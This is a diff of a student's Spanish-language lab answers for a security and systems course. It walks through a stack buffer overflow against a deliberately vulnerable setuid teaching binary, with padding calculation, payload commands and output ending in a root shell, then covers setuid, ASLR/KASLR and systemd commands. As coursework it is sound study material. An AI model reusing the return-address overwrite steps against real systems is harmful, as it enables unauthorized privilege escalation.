@@ -197,7 +197,7 @@ int login() {
 | ...                 |
 | 'a' (padding[14])   |  ← Byte 31
 +---------------------+
-| 'a' (access)        |  ← Byte 32: ¡Sobrescribe `access` con 'a' (0x41)!
+| 'a' (access)        |  ← Byte 32: Sobrescribe `access` con 'a' (0x41)
 +---------------------+
 ```
 
@@ -371,13 +371,53 @@ Ahora el proceso siempre retorna la misma dirección.
 
 ##### Calcule cuántos bytes de relleno necesita para pisar la dirección de retorno.
 
+- En la arquitectura x86_64, el stack tiene dos características fundamentales:
+  - **Crece hacia abajo**: La pila crece desde direcciones de memoria más altas hacia direcciones de memoria más bajas. Esto significa que cuando se hace un `push` de un valor, el puntero de la pila (RSP o Register Stack Pointer) se **decrementa** y el dato se almacena en esa nueva dirección más baja. Cuando se hace un pop de un valor, el puntero de la pila se **incrementa**.
+  - **Little Endian**: x86_64 es una arquitectura little-endian. Esto se refiere a cómo se almacenan los bytes de un valor multibyte en la memoria. En un sistema little-endian, **el byte menos significativo de un valor se almacena en la dirección de memoria más baja, y el byte más significativo se almacena en la dirección de memoria más alta**.
+- Cuando se llama a la función `login()`, el stack se organiza de la siguiente manera:
+
+```
++---------------------------------+
+| Contenido del stack             |
++---------------------------------+
+| Argumentos de la función        |
++---------------------------------+
+| Dirección de retorno            |
++---------------------------------+
+| RBP (Register Base Pointer)     |
++---------------------------------+
+| Variables locales de login()    |
++---------------------------------+
+```
+
+- Entonces, para pisar la dirección de retorno, se requieren:
+  - 16 bytes para rellenar `password`.
+  - 8 bytes para pisar RBP.
+  - Los próximos 8 bytes son donde tenemos que escribir la dirección de la función a la que queremos saltar (`privileged_fn()`) la cual es 0x5555555551c9.
+  - Por ende necesitamos **24 bytes** de padding.
+
 #### 7. Ejecute el script `payload_pointer.py` para generar el payload. La ayuda se puede ver con:
 
 ```sh
 python payload_pointer.py --help
 ```
 
+```sh
+juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ python3 payload_pointer.py --pointer-size 8 --endianness little --padding 24 --pointer 0x5555555551c9
+0123456789abcdefghijklmn�QUUUU
+```
+
 #### 8. Pruebe el payload redirigiendo la salida del script a `01-stack-overflow-ret` usando un pipe.
+
+```sh
+juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ (python3 payload_pointer.py --pointer-size 8 --endianness little --padding 24 --pointer 0x5555555551c9) | ./01-stack-overflow-ret
+privileged_fn: 0x5555555551c9
+Write password: uid = 1000, euid = 1000
+Failed to set UID to root: Operation not permitted
+Don't forget to set the owner and the SUID bit on this file:
+        chown root ./01-stack-overflow-ret
+        chmod u+s ./01-stack-overflow-ret
+```
 
 #### 9. Para poder interactuar con el shell invoque el programa usando el argumento `--program` del script `payload_pointer`. Por ejemplo:
 
@@ -385,11 +425,50 @@ python payload_pointer.py --help
 python payload_pointer.py --padding <padding> --pointer <pointer> --program ./01-stack-overflow-ret
 ```
 
+```sh
+juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ python3 payload_pointer.py --pointer-size 8 --endianness little --padding 24 --pointer 0x5555555551c9 --program ./01-stack-overflow-ret
+You will not see the prompt but try some commands like ls, id, pwd, etc.
+privileged_fn: 0x5555555551c9
+Write password: uid = 1000, euid = 1000
+Don't forget to set the owner and the SUID bit on this file:
+        chown root ./01-stack-overflow-ret
+        chmod u+s ./01-stack-overflow-ret
+```
+
+```sh
+root@juan-Lenovo-IdeaPad-S145-15AST:/home/juan/Downloads/codigo-para-practicas/practica5# chown root ./01-stack-overflow-ret
+root@juan-Lenovo-IdeaPad-S145-15AST:/home/juan/Downloads/codigo-para-practicas/practica5# chmod u+s ./01-stack-overflow-ret
+```
+
+```sh
+juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ python3 payload_pointer.py --pointer-size 8 --endianness little --padding 24 --pointer 0x5555555551c9 --program ./01-stack-overflow-ret
+You will not see the prompt but try some commands like ls, id, pwd, etc.
+```
+
 #### 10. Pruebe algunos comandos para verificar que realmente tiene acceso a un shell con UID 0.
+
+```sh
+juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ python3 payload_pointer.py --pointer-size 8 --endianness little --padding 24 --pointer 0x5555555551c9 --program ./01-stack-overflow-ret
+You will not see the prompt but try some commands like ls, id, pwd, etc.
+id
+uid=0(root) gid=1000(juan) groups=1000(juan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),105(lpadmin),124(sambashare),986(docker)
+whoami
+root
+ls -l /root
+total 0
+```
+
+Se puede ver claramente que tenemos privilegios de root.
 
 #### 11. Conteste:
 
 ##### a. ¿Qué efecto tiene setear el bit setuid en un programa si el propietario del archivo es `root`? ¿Qué efecto tiene si el usuario es por ejemplo `nobody`?
+
+El bit `setuid` es un permiso especial en Linux que se aplica a archivos ejecutables. Cuando se activa en un archivo ejecutable, permite que el programa se ejecute con los privilegios del propietario del archivo, en lugar de los privilegios del usuario que lo ejecuta.
+
+Si el propietario del archivo es `root`, cuando un usuario (incluso uno sin privilegios) ejecuta el programa con el bit setuid activado, el proceso se ejecutará con permisos de root.
+
+Si el propietario del archivo es `` nobody`, el programa se ejecutará con los permisos de  ``nobody`` (un usuario de bajos privilegios típico). Esto es útil para restringir los permisos de un programa, incluso si lo ejecuta un usuario con más privilegios (por ejemplo, un servicio que no deba acceder a archivos sensibles).
 
 ##### b. Compare el resultado del siguiente comando con la dirección de memoria de `privileged_fn()`. ¿Qué puede notar respecto a los octetos? ¿A qué se debe esto?
 
@@ -397,9 +476,25 @@ python payload_pointer.py --padding <padding> --pointer <pointer> --program ./01
 python payload_pointer.py --padding <padding> --pointer <pointer> | hd
 ```
 
+```sh
+juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ python3 payload_pointer.py --padding 24 --pointer 0x5555555551c9 | hd
+00000000  30 31 32 33 34 35 36 37  38 39 61 62 63 64 65 66  |0123456789abcdef|
+00000010  67 68 69 6a 6b 6c 6d 6e  c9 51 55 55 55 55 00 00  |ghijklmn.QUUUU..|
+00000020  0a 0a                                             |..|
+00000022
+```
+
+Puedo notar que se lee de derecha a izquierda por ser Little Endian. Además, noto que termina con 0a, que es el caracter de salto de línea. Esto le dice a la función `gets()` que deje de leer datos.
+
 ##### c. ¿Cómo ASLR ayuda a evitar este tipo de ataques en un escenario real donde el programa no imprime en pantalla el puntero de la función objetivo?
 
+ASLR ayuda porque no hay forma de saber la dirección donde la función objetivo se alojará, y tampoco hay forma de saber cuantos bytes se necesitan para pisar la dirección de retorno.
+
 ##### d. ¿Cómo podría evitar este tipo de ataques en un módulo del kernel de Linux? ¿Qué mecanismo debería estar habilitado?
+
+En un módulo del Kernel, se usa KASLR, la versión de ASLR específica para el Kernel. Esta versión aleatoriza la base de carga del propio kernel y sus módulos en la memoria virtual en cada arranque del sistema.
+
+Por ende debería estar habilitado KASLR.
 
 ### C - Ejercicio SystemD
 
@@ -413,23 +508,60 @@ python payload_pointer.py --padding <padding> --pointer <pointer> | hd
 
 ##### a. `systemctl enable`
 
+- Habilita una unidad (servicio, socket, etc.) de systemd.
+- Cuando una unidad se habilita, systemd crea un enlace simbólico desde el directorio de configuración del sistema (por ejemplo, `/etc/systemd/system/multi-user.target.wants/`) al archivo de unidad real (por ejemplo, `/usr/lib/systemd/system/nombre_servicio.service`).
+- Esto asegura que la unidad se inicie automáticamente en cada arranque del sistema, o cuando se cumplan las condiciones para su activación (en el caso de sockets o temporizadores).
+- Se usa principalmente para habilitar servicios que deben ejecutarse siempre.
+
 ##### b. `systemctl disable`
+
+- Deshabilita una unidad, lo que significa que se elimina el enlace simbólico creado anteriormente.
+- Al deshabilitar una unidad, se evita que se inicie automáticamente en los futuros arranques del sistema o que se active bajo las condiciones previamente configuradas.
+- Se usa principalmente para deshabilitar servicios que ya no es necesario que se inicien automáticamente.
 
 ##### c. `systemctl daemon-reload`
 
+- Le indica a systemd que recargue su configuración.
+- Es necesario ejecutarlo después de realizar cambios manuales en los archivos de unidad (por ejemplo, crear un nuevo archivo .service o modificar uno existente) para que systemd detecte y aplique esos cambios.
+- No es necesario ejecutar este comando luego de usar `systemctl enable` o `systemctl disable` porque esos comandos ya actualizan la configuración de systemd de forma interna.
+
 ##### d. `systemctl start`
+
+- Inicia una unidad inmediatamente.
+- Si la unidad es un servicio, lo ejecuta.
+- Si es un socket, lo activa.
 
 ##### e. `systemctl stop`
 
+- Detiene una unidad que se está ejecutando.
+- Si es un servicio, lo termina.
+
 ##### f. `systemctl status`
+
+- Muestra el estado actual de una unidad.
+- Proporciona información valiosa como si la unidad está activa o inactiva, si está habilitada o deshabilitada, su PID, su uso de memoria, las últimas líneas de su registro y los procesos asociados.
+- Se suele usar para verificar el estado de un servicio, diagnosticar problemas o simplemente obtener información sobre una unidad.
 
 ##### g. `systemd-cgls`
 
+- Muestra la jerarquía de **cgroups** administrados por systemd.
+- systemd utiliza cgroups para gestionar y aislar los servicios y procesos, lo que facilita el control de recursos y la contabilidad.
+- Se suele usar para entender cómo systemd organiza los procesos, diagnosticar problemas de rendimiento o ver cuáles servicios están consumiendo más recursos.
+
 ##### h. `journalctl -u [unit]`
+
+- Muestra los registros (logs) de una unidad específica.
+- `journalctl` es la utilidad de línea de comandos para consultar el Systemd Journal, que es el sistema de registro centralizado de systemd. Permite filtrar los registros por unidad, por tiempo, por prioridad, etc.
 
 #### 2. Investigue las siguientes opciones que se pueden configurar en una unit service de `systemd`:
 
 ##### a. IPAddressDeny e IPAddressAllow
+
+- Controlan el acceso a la red de los procesos asociados a esa unidad.
+- Definen reglas de filtrado de direcciones IP para el tráfico de red de la unidad. Esto se hace a nivel del kernel de Linux, utilizando los cgroups y las capacidades de filtrado de IP.
+- **IPAddressAllow**: Si la dirección IP que se está verificando coincide con una entrada en la lista IPAddressAllow=, se permite el acceso.
+- **IPAddressDeny**: Si la dirección IP que se está verificando coincide con una entrada en la lista IPAddressDeny=, se deniega el acceso.
+- Si la dirección IP no coincide con ninguna de las reglas anteriores, se permite el acceso.
 
 ##### b. User y Group
 
